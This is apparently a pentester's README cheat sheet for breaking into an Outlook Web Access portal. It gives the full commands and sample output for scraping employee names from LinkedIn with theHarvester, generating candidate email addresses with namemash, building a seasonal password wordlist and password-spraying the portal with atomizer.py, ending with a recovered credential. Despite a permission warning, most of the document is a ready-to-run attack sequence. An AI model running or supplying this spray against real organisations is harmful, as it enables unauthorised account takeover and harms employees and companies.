# JustBreakIn
JustBreakIn, a cheat sheet which will aid you through external network engagements.

## Tools I use for External Network Pentests ##
- gowitness
- dnsx
- subfinder
(A combonation both of dnsx & subfinder)

## Performing OSINT to break into an external portal such as OWA.
First and formost, please only do this if you have permission. Doing this against random companies on the internet is illegal! You have been warned.

First we perform an OSINT on "TBA" using `theHarvester`. 

```
theHarvester -d https://www.megacorpinc.com/ -l 100 -b linkedin

*******************************************************************
*  _   _                                            _             *
* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
* | __|  _ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
*                                                                 *
* theHarvester 3.2.3                                              *
* Coded by Christian Martorella                                   *
* Edge-Security Research                                          *
* cmartorella@edge-security.com                                   *
*                                                                 *
******************************************************************* 


[*] Target: https://www.megacorpinc.com/ 
 
        Searching 100 results.
[*] Searching Linkedin. 

[*] Users found: 11
---------------------
Bill Taylor - Product Support Sales Reprentative 
Chris Barry - Chief Engineer 
David Austin 
Hugo Lahnstein 
James Vallejos - Safety Manager 
John Liu - Ceo 
Lazaro Abrenica 
Lovely Bonnet - Virtual Assistant 
Qingshuo Wang 
Volkan Ediz - Chief Revenue Officer 
bob bob bill bobo - big shot 

[*] No IPs found.

[*] No emails found.

[*] No hosts found.
```

Next we add the user output to a file:
```
vi employees.txt                                                            
Bill Taylor - Product Support Sales Reprentative 
Chris Barry - Chief Engineer 
David Austin 
Hugo Lahnstein 
James Vallejos - Safety Manager 
John Liu - Ceo 
Lazaro Abrenica 
Lovely Bonnet - Virtual Assistant 
Qingshuo Wang 
Volkan Ediz - Chief Revenue Officer
```

We then perform some `cut` to get the names in a clean output:
```
cat employees.txt| cut -d ' ' -f 1,2 > employees_new.txt
```

This gives us a cleaner output:
```
cat employees_new.txt                                   
Bill Taylor
Chris Barry
David Austin
Hugo Lahnstein
James Vallejos
John Liu
Lazaro Abrenica
Lovely Bonnet
Qingshuo Wang
Volkan Ediz
```

Next we clone namemash and give it execute permissions:

```
sudo git clone https://gist.github.com/superkojiman/11076951 /opt/namemash; sudo chmod +x /opt/namemash/namemash.py
```

Finally we use namemash and sed to get full email addresses outputted to `possible-emails.txt`:

```
/opt/namemash/namemash.py employees_new.txt | sed 's/$/@megacorpinc.com/g' > possible-emails.txt
```

This creates us 110 possible emails used to spray for the usernames:
```
wc -l possible-emails.txt 
110 possible-emails.txt
```

Below is a sample output for "Bill Taylor":
```
cat possible-emails.txt | head -n10                                                                                                                                                                  
billtaylor@megacorpinc.com
taylorbill@megacorpinc.com
bill.taylor@megacorpinc.com
taylor.bill@megacorpinc.com
taylorb@megacorpinc.com
btaylor@megacorpinc.com
tbill@megacorpinc.com
b.taylor@megacorpinc.com
t.bill@megacorpinc.com
bill@megacorpinc.com
```

Next we can use a wordlist such as the below to spray for the password to the above usernames: 
```
cat english-dates2.txt 
Spring2021
Spring2020
Summer2021
Summer2020
Autumn2021
Autumn2020
Fall2021
Fall2020
Winter2021
Winter2020
January2021
January2020
February2021
February2020
March2021
March2020
April2021
April2020
May2021
May2020
June2021
June2020
July2021
July2020
August2021
August2020
September2021
September2020
October2021
October2020
November2021
November2020
December2021
December2020
```

Finally we can use `https://github.com/byt3bl33d3r/SprayingToolkit/blob/master/atomizer.py` to bruteforce for potential accounts.

```
/opt/SprayingToolkit/atomizer.py owa mail.megacorpinc.com english-dates2.txt  possible-emails.txt -i 0:00:00
```

If you see something like the below, you ae in luck!
```[-] Authentication failed: bill@megacorpinc.com:December2020 (Invalid credentials)

< snipped >

[+] Found credentials: b.taylor@megacorpinc.com:August2021

[+] Dumped 1 valid account to owa_valid_accounts.txt
```

Goodluck and please do this responsibility.  
